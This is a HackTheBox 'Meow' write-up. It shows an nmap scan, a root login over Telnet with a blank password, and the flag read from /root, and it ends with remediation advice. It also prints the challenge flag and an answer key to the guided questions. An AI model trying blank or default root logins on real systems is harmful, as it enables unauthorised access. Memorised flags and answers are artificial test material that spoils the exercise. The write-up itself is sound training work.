# Meow — HackTheBox Starting Point Writeup

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?logo=hackthebox&logoColor=black)
![Tier](https://img.shields.io/badge/Tier-0-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue?logo=linux&logoColor=white)
![Flags](https://img.shields.io/badge/Flags-1-orange)
![Foothold](https://img.shields.io/badge/Foothold-Telnet%20(23)-red)

> **Target:** `10.129.73.4`
> **Foothold:** Unauthenticated **Telnet** login as `root` with a blank password.

---

## 🧭 Overview

A single open **Telnet** service (`23/tcp`) allowed a direct login as **`root`** with a
**blank password**, dropping straight into a root shell. The flag was readable in `/root/`
— no privilege escalation required.

---

## 1. Reconnaissance

```bash
nmap 10.129.73.4
```

```text
PORT   STATE SERVICE
23/tcp open  telnet
```

Telnet is a cleartext remote-login protocol — an exposed Telnet service is a strong signal
of weak, default, or missing authentication.

---

## 2. Foothold — Telnet

```bash
telnet 10.129.73.4
```

At the `login:` prompt, entering **`root`** with **no password** gave an interactive shell:

```text
Meow login: root
root@Meow:~#
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 3. Flag

```bash
cat /root/flag.txt
```

<details>
<summary>🚩 Click to reveal — FLAG</summary>

```text
b40abdfe23665f766f9c61ecba8a4c19
```
</details>

---

## 📝 Task Questions & Answers

<details>
<summary>📋 Click to reveal — guided task answers</summary>

| # | Question | Answer |
|---|----------|--------|
| 1 | What does the acronym VM stand for? | Virtual Machine |
| 2 | What tool do we use to interact with the OS to start our VPN connection? | Terminal |
| 3 | What service do we use to form our VPN connection? | OpenVPN |
| 4 | What abbreviated name for a 'tunnel interface' appears in the VPN boot-up output? | tun |
| 5 | What tool do we use to test our connection to the target? | ping |
| 6 | What's the name of the tool we use to scan the target's ports? | nmap |
| 7 | What service do we identify on port 23/tcp during our scan? | telnet |
| 8 | What username works with the remote management login prompt? | root |
| 9 | Submit root flag | `b40abdfe23665f766f9c61ecba8a4c19` |

</details>


---

## 🛡️ Lessons / Remediation
- **Disable Telnet**; replace with **SSH** using key-based authentication.
- Never leave blank or default credentials on a remotely accessible service.
- Firewall and segment management services off the network edge.
